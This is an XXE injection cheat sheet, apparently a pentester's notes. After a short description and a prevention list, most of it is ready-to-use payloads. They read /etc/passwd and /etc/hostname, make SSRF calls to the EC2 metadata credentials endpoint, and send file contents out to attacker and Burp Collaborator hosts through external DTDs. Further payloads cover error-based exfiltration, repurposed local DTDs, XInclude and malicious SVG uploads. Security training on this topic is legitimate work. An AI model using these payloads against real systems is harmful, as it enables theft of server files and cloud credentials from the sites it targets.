# Description
**XML External Entity (XXE) Injection** is a vulnerability that occurs when an application processes user-supplied XML input in an insecure manner. This allows an attacker to include an external entity reference in the XML data, which can be used to read local files, perform server-side request forgery (SSRF), or even execute arbitrary code in certain cases.

### How Does XXE Injection Occur?

XXE injection happens when the following conditions are met:
1. **The application parses XML data provided by the user**: If an application accepts XML data as input, it may be vulnerable if not properly configured.
2. **External entities are not disabled in the XML parser**: By default, some XML parsers allow the use of external entities, which can be exploited by attackers.
3. **User-controlled XML input**: When the XML input can be manipulated by the attacker, they can define external entities to access files, make network requests, or cause other unintended actions.

### Where to Put an XXE Injection Payload?

An XXE payload is placed within the XML data that the web application processes. This could be in:
1. The body of an HTTP request if the content is XML.
2. User-supplied data that is incorporated into an XML request or response.
3. XML-based protocols like SOAP or REST that use XML data structures.

### Examples of HTTP Requests with XXE Injection

#### 1. Basic XXE Injection to Read Local Files

In this example, the XML input contains a defined external entity that points to a local file (`/etc/passwd`). The payload is then used to display the contents of that file.

**Example HTTP Request:**
```http
POST /parse-xml HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 204

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<request>
  <name>&xxe;</name>
</request>
```
In this example, the `<!DOCTYPE>` declaration is used to define an external entity named `xxe`, which references the local file `/etc/passwd`. When the XML is processed, the entity `&xxe;` is replaced with the file's contents, potentially exposing sensitive data.

#### 2. XXE to Perform Server-Side Request Forgery (SSRF)

An XXE payload can be used to force the server to make HTTP requests to internal services.

**Example HTTP Request:**
```http
POST /parse-xml HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 210

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> 
]>
<request>
  <name>&xxe;</name>
</request>
```
Here, the external entity `xxe` points to `http://169.254.169.254/latest/meta-data/`, which is the AWS EC2 metadata service. If processed, the server would attempt to fetch data from this service, potentially leaking internal information.

#### 3. Out-of-Band (OOB) XXE Attack

OOB XXE uses an external entity that makes an HTTP or DNS request to a server controlled by the attacker. This can be used to exfiltrate data or confirm the vulnerability.

**Example HTTP Request:**
```http
POST /parse-xml HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 210

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://attacker-server.com/xxe?data=leak"> 
]>
<request>
  <name>&xxe;</name>
</request>
```
In this case, the entity `xxe` would cause the server to make a request to `http://attacker-server.com/xxe?data=leak`, confirming the vulnerability and possibly leaking some data.

### Preventing XXE Injection

To prevent XXE vulnerabilities:
- **Disable external entity processing** in XML parsers.
- **Use safer XML parsers** or libraries that do not support external entities by default.
- **Validate and sanitize** XML input before processing.
- **Avoid using XML altogether** if possible, or limit XML functionality.

XXE Injection is a serious vulnerability that can lead to data theft, system compromise, or other security issues, making secure XML parsing crucial for any web application.

# Contents
* [Hidden attack surface](#Hidden-XXE-attack-surface-via-exploiting-XInclude-to-retrieve-files)
# XXE Payloads

### External source for learning and exploiting
https://youtu.be/gjm6VHZa_8s?si=kYbaFjUQXSRGJ5HZ
## Note

Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.

### Normal Method
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  >> For retrieving server files.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>  >> For SSRF attack.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
&xxe;
```
Note: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin endpoint EC2 to retrieve info for SSRF.
#### Example:
Before Injection:
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```
After Injection:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use ```XML parameter entities instead```.
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://x0yhzy601i8gxlhsy2md1wesxj3ar2fr.oastify.com"> %xxe; ]>  >> For Blind xxe via XML parameter entities.
```
#### Example:
Blind Injection via ```XML parameter entities```.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://attacker-doamin.com/?x=/etc/passwd"> %xxe; ]>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```
With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
### Exploiting blind XXE via external DTD server
Host this payloads with burp collaborator in external DTD server.<br>
To exfiltrate data in collaborator server.
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://uljekvrxmftdii2pjz7amtzpigo7c50u.oastify.com/?x=%file;'>">
%eval;
%exfil;
```
To retrieve data via error messages.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
Now paste the attackers external DTD server link in vulnerable xml field.
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://attacker-external.dtd.server"> %xxe; ]>
```
### Exploiting XXE to retrieve data by repurposing a local DTD against known Operating System
Locate an existing DTD file to repurpose. For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing. Try bruteforcing with common dtd file names via burp intruder to identify local dtd file. 
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Now use this payload with identified dtd.
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
or use this if not working
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
### Hidden XXE attack surface via exploiting XInclude to retrieve files
Some applications receive client-submitted data via parameter value(id=1) without xml body, embed it on the server-side into an XML document, and then parse the document. In this situation try this method. Use ```&xxe; (encode & to %26)``` to parameter value(id=&xxe;) to identify xxe via error message. Then place this payload in value to retrieve file.
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
### Exploiting XXE via image file upload

    Change: 
        filename="test.png" to filename="attack.svg" 
        Content-Type: image/png to Content-Type: image/svg+xml
        
Then put this payload in pixel data.
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
**Note: The ```svg``` Image format uses XML**
### Exploiting XXE via modified Content-Type
Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Then you might be able submit the following request, with the same result:
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format. 
